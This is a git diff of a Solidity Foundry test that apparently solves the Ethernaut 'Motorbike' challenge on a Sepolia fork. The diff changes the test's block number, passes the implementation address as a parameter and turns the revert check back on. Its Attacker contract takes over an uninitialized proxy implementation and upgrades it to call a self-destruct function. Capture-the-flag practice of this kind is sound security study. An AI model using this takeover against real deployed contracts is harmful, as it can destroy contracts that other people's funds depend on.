@@ -9,13 +9,13 @@ interface Motorbike{
     function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
 }
 
+// no longer works from cancun
 contract Attacker {
     address owner;
     constructor(){
         owner = msg.sender;
     }
-    function attack() public {
-        address impl = 0x1a5D761CAad5A7048D2AEbEcf43f157CA52Dad29;
+    function attack(address impl) public {
         Motorbike(impl).initialize();
         Motorbike(impl).upgradeToAndCall(address(this), abi.encodeWithSignature("killit()"));
     }
@@ -27,16 +27,16 @@ contract Attacker {
 
 contract PuzzleWalletTest is Test {
     function setUp() public {
-        vm.createSelectFork("sepolia", 5462397);
+        vm.createSelectFork("sepolia", 5467848);
     }
 
     function test_motorbike() public {
+        Motorbike motorbike = Motorbike(0x60A687AdB38B109D36Fab82f7BCb71220D4d9d7c);
         Attacker attacker =  new Attacker();
-        attacker.attack();
-
+        attacker.attack(0x8329F94e77771BABDEd95D19112EE831abEe21cf);
 
         // This stops working from Cancun upgrade
-        // vm.expectRevert();
-        // motorbike.upgrader();
+        vm.expectRevert();
+        motorbike.upgrader();
     }
 }
